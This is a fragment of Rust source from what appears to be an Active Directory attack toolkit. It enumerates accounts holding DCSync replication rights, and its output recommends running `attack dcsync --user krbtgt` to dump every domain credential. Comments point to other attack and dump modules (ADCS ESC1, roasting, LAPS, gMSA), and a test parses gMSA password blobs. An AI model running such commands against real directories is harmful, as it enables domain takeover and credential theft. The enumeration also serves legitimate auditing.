        P::DcsyncGetChangesAll,
        P::DcsyncGetChangesFiltered,
    ] {
        for (src, dst) in graph.direct_edges_to_tier0(kind.into()) {
            who.push((src, dst, kind));
        }
    }
    if who.is_empty() {
        println!("== DCShadow-capable principals ==");
        println!("  (none found — no principal outside Tier-0 holds replication rights)");
    } else {
        println!("== DCShadow-capable principals ({}) ==", who.len());
        for (src, dst, kind) in &who {
            println!("  {src:<32} → {dst}   [{}]", kind.name());
        }
        println!();
        println!(
            "These already have DCSync. Each is a shortcut to DA — running `attack dcsync --user krbtgt`"
        );
        println!("as any of them dumps the whole domain without a lateral move.");
    }
    Ok(())
}

// fn check_adcs moved to `checks::adcs` in arch-0.

// fn dump_laps moved to `dumps::laps` in arch-0.

// fn dump_gmsa moved to `dumps::gmsa` in arch-0.
// EscVariant + IcprEsc1Args + fn icpr_esc1 moved to attacks::icpr_esc1 in arch-0.

// fn unconstrained moved to `attacks::unconstrained` in arch-0.
// fn roast moved to `attacks::roast` in arch-0.

#[cfg(test)]
mod managed_pw_blob_tests {
    use super::parse_managed_password_blob;

    #[test]
    fn managed_password_blob_extracts_current() {
        let mut b = vec![1, 0, 0, 0]; // version + reserved
        b.extend_from_slice(&0u32.to_le_bytes()); // length
        b.extend_from_slice(&16u16.to_le_bytes()); // CurrentPasswordOffset
        b.extend_from_slice(&0u16.to_le_bytes()); // PreviousPasswordOffset = none
        b.extend_from_slice(&0u16.to_le_bytes()); // QueryPasswordInterval
        b.extend_from_slice(&0u16.to_le_bytes()); // UnchangedPasswordInterval
        b.extend_from_slice(&[0xAB; 256]); // CurrentPassword
        let pw = parse_managed_password_blob(&b).unwrap();
        assert_eq!(pw.len(), 256);
        assert!(pw.iter().all(|&x| x == 0xAB));
    }
}
